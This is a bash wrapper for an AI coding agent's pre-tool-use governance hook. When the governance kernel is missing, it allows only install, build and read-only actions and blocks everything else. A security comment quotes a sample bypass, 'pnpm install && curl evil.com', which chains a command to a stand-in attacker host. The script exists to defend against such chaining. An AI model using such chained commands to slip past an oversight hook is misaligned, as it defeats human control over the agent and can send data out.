#!/usr/bin/env bash
# claude-hook-wrapper.sh — Sources persona identity before running governance hook
# SECURITY: This script MUST fail closed for non-bootstrap actions.
# Bootstrap exemption: install/build commands and read-only tools are allowed
# when the kernel binary is not yet available (AgentGuardHQ/agentguard#995).

# Resolve project root (hook CWD may not match the project directory)
AGENTGUARD_WORKSPACE="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
export AGENTGUARD_WORKSPACE

# Source persona env vars if available (set -a exports all sourced vars)
if [ -f "$AGENTGUARD_WORKSPACE/.agentguard/persona.env" ]; then
  set -a
  source "$AGENTGUARD_WORKSPACE/.agentguard/persona.env"
  set +a
fi

# Check if the CLI binary exists (dev mode uses local dist)
AGENTGUARD_BIN=""
if [ -f "$AGENTGUARD_WORKSPACE/apps/cli/dist/bin.js" ]; then
  AGENTGUARD_BIN="node $AGENTGUARD_WORKSPACE/apps/cli/dist/bin.js"
elif command -v agentguard &>/dev/null; then
  AGENTGUARD_BIN="agentguard"
fi

# BOOTSTRAP EXEMPTION (AgentGuardHQ/agentguard#995):
# When the kernel binary is missing, allow bootstrap commands (install/build)
# and read-only tools through so the agent can self-bootstrap.
# All other actions remain blocked (fail-closed).
if [ -z "$AGENTGUARD_BIN" ]; then
  # Read stdin to inspect the hook payload
  HOOK_PAYLOAD="$(cat)"
  BOOTSTRAP_SAFE=0

  # Check if this is a bootstrap-safe Bash command (install/build)
  case "$HOOK_PAYLOAD" in
    *'"command":"pnpm install'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"pnpm i'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"npm install'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"npm ci'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"npm i'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"yarn install'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"yarn"'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"pnpm build'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"npm run build'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"yarn build'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"npx turbo build'* ) BOOTSTRAP_SAFE=1 ;;
    *'"command":"pnpm turbo build'* ) BOOTSTRAP_SAFE=1 ;;
  esac

  # Check if this is a read-only tool (safe regardless of kernel state)
  case "$HOOK_PAYLOAD" in
    *'"tool_name":"Read"'* ) BOOTSTRAP_SAFE=1 ;;
    *'"tool_name":"Glob"'* ) BOOTSTRAP_SAFE=1 ;;
    *'"tool_name":"Grep"'* ) BOOTSTRAP_SAFE=1 ;;
    *'"tool_name":"LS"'* ) BOOTSTRAP_SAFE=1 ;;
    *'"tool_name":"WebSearch"'* ) BOOTSTRAP_SAFE=1 ;;
    *'"tool_name":"WebFetch"'* ) BOOTSTRAP_SAFE=1 ;;
  esac

  # SECURITY: reject if command contains chaining operators (&&, ||, ;, |, backtick)
  # This prevents bypasses like "pnpm install && curl evil.com"
  if [ "$BOOTSTRAP_SAFE" -eq 1 ]; then
    CMD_VALUE=$(echo "$HOOK_PAYLOAD" | grep -oP '"command"\s*:\s*"\K[^"]*' | head -1)
    if echo "$CMD_VALUE" | grep -qE '&&|\|\||[;`]|\|[^|]'; then
      BOOTSTRAP_SAFE=0
    fi
  fi

  if [ "$BOOTSTRAP_SAFE" -eq 1 ]; then
    # Allow through — emit a warning so the agent knows governance is not active
    echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","additionalContext":"[AgentGuard bootstrap] Kernel binary not found — allowing bootstrap/read-only action. Run pnpm install && pnpm build to enable full governance."}}'
    exit 0
  fi

  # Not a bootstrap command — fail closed
  echo '{"decision":"block","reason":"AgentGuard kernel binary not found — governance cannot evaluate this action. Run: pnpm install && pnpm build"}'
  exit 0
fi

# Pass through to the actual hook
exec $AGENTGUARD_BIN claude-hook pre --store sqlite
